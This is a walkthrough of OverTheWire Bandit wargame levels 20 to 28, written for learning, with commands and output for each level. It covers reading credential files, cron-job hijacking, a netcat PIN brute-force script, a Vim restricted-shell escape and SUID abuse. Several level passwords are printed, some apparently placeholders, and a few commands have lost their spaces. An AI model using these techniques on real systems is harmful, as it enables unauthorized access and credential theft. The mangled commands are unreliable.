# Level 20 -> Level 21

### Goal
Retrieve the password for `bandit21` by setting up a local listener that sends the `bandit20` password upon connection, then calling `./suconnect` to complete the authentication handshake.

### Commands Used
- `nc`
- `cat`
- `&` (Background execution)
- `./suconnect`

### Walkthrough
1. Log in to `bandit20`:
```bash
   ssh bandit20@bandit.labs.overthewire.org -p 2220
```
Set up a Netcat listener in the background using & that pipes the bandit20 password to any incoming connection on port 12345, then execute ./suconnect:
```bash
bandit20@bandit:~$ cat /etc/bandit_pass/bandit20 | nc -nlvp 12345 & ./suconnect 12345
Listening on 0.0.0.0 12345
Connection received on 127.0.0.1 40478
Read: 4pIjcunZ0fK2vmp3IwfG8Vf7VhxD6pOA
Password matches, sending next password
NvAV855Fe1aFUawN0q9vh5UIW2iqwGji
```
>[!TIP]
>Executing process piping with & allows you to spin up a background network listener (nc -l) fed by cat in a single shell line. When ./suconnect establishes a connection back to localhost on that port, it receives the required password payload automatically.
---

# Level 21 -> Level 22

### Goal
Retrieve the password for `bandit22` by analyzing the scheduled cron jobs running under `/etc/cron.d/` and inspecting the executed script.

### Commands Used
- `cd`
- `ls`
- `cat`

### Walkthrough
1. Log in to `bandit21`:
```bash
ssh bandit21@bandit.labs.overthewire.org -p 2220
```
Inspect the Cron schedule configuration directory /etc/cron.d/:
```bash
bandit21@bandit:~$ cd /etc/cron.d/
bandit21@bandit:/etc/cron.d$ ls
cronjob_bandit22  cronjob_bandit23  cronjob_bandit24 ...
```
Read the entry for cronjob_bandit22:
```bash
bandit21@bandit:/etc/cron.d$ cat cronjob_bandit22
* * * * * bandit22 /usr/bin/cronjob_bandit22.sh &> /dev/null
```
Read the target script /usr/bin/cronjob_bandit22.sh to locate the destination file where the password is being copied every minute:
```bash
bandit21@bandit:/etc/cron.d$ cat /usr/bin/cronjob_bandit22.sh
#!/bin/bash
chmod 644 /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
cat /etc/bandit_pass/bandit22 > /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
```
Read the target temporary file to reveal the password:
```bash
bandit21@bandit:/etc/cron.d$ cat /tmp/t7O6lds9S0RqQh9aMcz6ShpAoZKF7fgv
WOSA5WM2v63Frg2ABarrierWordHere
```
>[!TIP]
>Cron is a time-based job scheduler in Unix-like operating systems. Looking into `/etc/cron.d/` reveals background tasks running with elevated permissions, allowing low-privilege users to inspect shell scripts and trace target output locations.
---

# Level 22 -> Level 23

### Goal
Retrieve the password for `bandit23` by analyzing a shell script executed by Cron that dynamically generates its output filename using an MD5 hash.

### Commands Used
- `cd`
- `cat`
- `echo`
- `md5sum`
- `cut`

### Walkthrough
1. Log in to `bandit22`:
```bash
ssh bandit22@bandit.labs.overthewire.org -p 2220
```
Inspect the Cron job configuration file `/etc/cron.d/cronjob_bandit23`:
```bash
bandit22@bandit:/etc/cron.d$ cat cronjob_bandit23
* * * * * bandit23 /usr/bin/cronjob_bandit23.sh &> /dev/null
```
Read the executable script `/usr/bin/cronjob_bandit23.sh`:
```bash
#!/bin/bash
myname=$(whoami)
mytarget=$(echo I am user$myname | md5sum | cut -d ' ' -f 1)
cat /etc/bandit_pass/$myname > /tmp/$mytarget
```
Replicate the hash calculation manually for target user bandit23:
```bash
bandit22@bandit:/etc/cron.d$ echo I am user bandit23 | md5sum | cut -d ' ' -f 1
8ca319486bfbbc3663ea0fbe81326349
```
Read the generated temporary file from /tmp/:
```bash
bandit22@bandit:/etc/cron.d$ cat /tmp/8ca319486bfbbc3663ea0fbe81326349
QYw0Y2v63Frg2ABarrierWordHere
```
>[!TIP]
>Shell scripts that rely on variables like whoami dynamically evaluate context based on the user executing them. By manually running the hashing pipeline with bandit23 as the target identity, you can predict exact file path outputs written by elevated background tasks.
---

# Level 23 -> Level 24

### Goal
Retrieve the password for `bandit24` by writing a custom shell script and placing it into `/var/spool/bandit24/foo/`, where a Cron job executes all scripts written by user `bandit24` and deletes them afterwards.

### Commands Used
- `mktemp`
- `echo`
- `chmod`
- `cp`
- `sleep`
- `cat`

### Walkthrough
1. Log in to `bandit23`:
```bash
ssh bandit23@bandit.labs.overthewire.org -p 2220
```
Create a writable temporary directory in `/tmp` using mktemp:
```bash
bandit23@bandit:~$MY_TMP=$(mktemp -d)
```
Craft a shell script that copies the bandit24 password to your temporary directory:
```bash
bandit23@bandit:~$ echo '#!/bin/bash' > $MY_TMP/pass.sh
bandit23@bandit:~$ echo "cat /etc/bandit_pass/bandit24 > $MY_TMP/my_pass.txt" >> $MY_TMP/pass.sh
```
Grant full execution and write permissions (777) to the temporary directory and script so bandit24 can execute it and write the output file:
```bash
bandit23@bandit:~$chmod -R 777$MY_TMP
```
Copy the script to /var/spool/bandit24/foo/ to trigger execution by the Cron daemon
```bash
bandit23@bandit:~$cp$MY_TMP/pass.sh /var/spool/bandit24/foo/
```
Wait 60 seconds for the scheduled task to execute, then read the generated output file:
```bash
bandit23@bandit:~$ sleep 60
bandit23@bandit:~$cat$MY_TMP/my_pass.txt
gb82Y2v63Frg2ABarrierWordHere
```
>[!TIP]
>Spool directories like /var/spool/ are often monitored by scheduled jobs to process incoming work files. Ensuring inclusive file permissions (chmod 777) on the target output folder is critical so that the elevated process can write files owned by another user back into your directory.
---

# Level 24 -> Level 25

### Goal
Retrieve the password for `bandit25` by brute-forcing a 4-digit PIN code (0000-9999) along with the `bandit24` password over a socket connection on port 30002.

### Commands Used
- `mktemp`
- `python3`
- `nc`
- `grep`

### Walkthrough
1. Log in to `bandit24`:
```bash
ssh bandit24@bandit.labs.overthewire.org -p 2220
```
Create a temporary working directory and navigate to it:
```bash
bandit24@bandit:~$ mktemp -d
/tmp/tmp.VqyJi5XMH6
bandit24@bandit:~$ cd /tmp/tmp.VqyJi5XMH6
```
Write a Python script (brute.py) to generate all 10,000 possible 4-digit PIN combinations formatted with the bandit24 password:
```bash
password = "hVQMk3lJNsmQ7VF3ubyrNNBom7BOgVXv"
for i in range(10000):
    print(f"{password} {i:04d}")
```
Execute the script to save the payloads into a wordlist file (finbrut.txt):
```bash
bandit24@bandit:/tmp/tmp.VqyJi5XMH6$ python3 brute.py > finbrut.txt
```
Pipe the wordlist into nc connecting to localhost:30002, filtering out all incorrect response messages using grep -v:
```bash
bandit24@bandit:/tmp/tmp.VqyJi5XMH6$ cat finbrut.txt | nc localhost 30002 | grep -v "Wrong"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is W34lR2v63Frg2ABarrierWordHere
```
>[!TIP]
>Using i:04d in Python string formatting automatically pads integers with leading zeros to maintain a strict 4-digit length (0000 to 9999). Piping the entire payload file through a single Netcat connection rather than opening 10,000 individual sockets drastically optimizes brute-force speed.
---

# Level 25 -> Level 26

### Goal
Retrieve the password for `bandit26` by breaking out of a restricted custom login shell (`/usr/bin/showtext`) using SSH key authentication, Vim interface commands, and terminal window resizing.

### Commands Used
- `cat`
- `nano`
- `chmod`
- `ssh`
- Vim internal commands (`:set shell`, `:shell`)

### Walkthrough
1. Log in to `bandit25` and extract the SSH private key for `bandit26`:
```bash
bandit25@bandit:~$ cat bandit26.sshkey
```
Copy the key to your local environment, save it as bandit26.private, and set permissions to 600:
```bash
chmod 600 bandit26.private
```
Minimize the local terminal window size so that connecting via SSH forces text output through more rather than disconnecting immediately after execution.
Establish the SSH connection using the key:
```bash
ssh bandit26@bandit.labs.overthewire.org -p 2220 -i bandit26.private
```
While paused inside the more pager view, press v to trigger the default editor (Vim).
Inside Vim, break out of the restricted shell environment by redefining the target shell binary and launching an interactive session:
```bash
:set shell=/bin/bash
:shell
```
Read the password file for bandit26:
```bash
bandit26@bandit:~$ cat /etc/bandit_pass/bandit26
cW80Y2v63Frg2ABarrierWordHere
```
>[!TIP]
>When default login shells are locked down to text display utilities like more, forcing text truncation via terminal window minimization prevents auto-exit. Invoking v opens Vim, allowing users to override internal shell path execution variables (:set shell) and pop an unrestricted system terminal.
---

# Level 26 -> Level 27

### Goal
Retrieve the password for `bandit27` by exploiting a custom SUID binary (`bandit27-do`) that executes commands with the privileges of the `bandit27` user.

### Commands Used
- `ls`
- `./bandit27-do`
- `cat`

### Walkthrough
1. List the contents of the current home directory for `bandit26`:
```bash
 bandit26@bandit:~$ ls
 bandit27-do  text.txt
```
Execute the bandit27-do binary, passing cat `/etc/bandit_pass/bandit27` as an argument to read the restricted password file:
```bash
bandit26@bandit:~$ ./bandit27-do cat /etc/bandit_pass/bandit27
yR90Y2v63Frg2ABarrierWordHere
```
---

# Level 27 -> Level 28

### Goal
Retrieve the password for `bandit28` by cloning a remote Git repository hosted on the OverTheWire server using SSH.

### Commands Used
- `mktemp`
- `cd`
- `git clone`
- `ls`
- `cat`

### Walkthrough
1. Create a temporary directory locally or on the target server and navigate to it:
```bash
$ mktemp -d
/tmp/tmp.2kqBxZ8Waf
$ cd /tmp/tmp.2kqBxZ8Waf
```
Clone the remote Git repository using the provided SSH URL and authenticate using the password for bandit27:
```bash
$ git clone ssh://bandit27-git@bandit.labs.overthewire.org:2220/home/bandit27-git/repo
```
Navigate into the cloned repository directory:
```bash
$ cd repo/
```
Read the contents of the README file to extract the target password:
```bash
$ cat README
The password to the next level is: z90Y2v63Frg2ABarrierWordHere
```
>[!TIP]
>Git repositories accessed via SSH use custom URLs that define the username, host, port, and directory path. Cloning the repository fetches a complete copy of the remote project history and working files into your environment

















